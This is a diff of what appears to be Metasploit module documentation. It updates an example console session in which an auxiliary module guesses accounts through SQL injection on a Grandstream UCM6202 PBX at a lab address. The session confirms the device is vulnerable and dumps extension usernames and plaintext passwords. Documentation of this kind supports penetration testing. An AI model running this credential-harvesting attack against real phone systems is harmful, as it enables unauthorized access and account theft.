@@ -40,14 +40,14 @@ Specifies base URI. The default value is `/`.
 ### Grandstream UCM6202 IP PBX firmware version 1.0.20.20
 
 ```
-msf6 > use auxiliary/gather/grandstream_ucm62xx_sql_account_guess
-msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.7
+msf > use auxiliary/gather/grandstream_ucm62xx_sql_account_guess
+msf auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > set RHOST 10.0.0.7
 RHOST => 10.0.0.7
-msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > check
+msf auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > check
 
 [*] Requesting version information from /cgi
 [*] 10.0.0.7:8089 - The target appears to be vulnerable. The self-reported version is: 1.0.20.20
-msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > run
+msf auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > run
 [*] Running module against 10.0.0.7
 
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -60,5 +60,5 @@ msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > run
 [*] Found the following username and password: 1003 - pM6mo!E8u37k
 [*] Found the following username and password: 1004 - mC7N68dm8h
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > 
+msf auxiliary(gather/grandstream_ucm62xx_sql_account_guess) > 
 ```
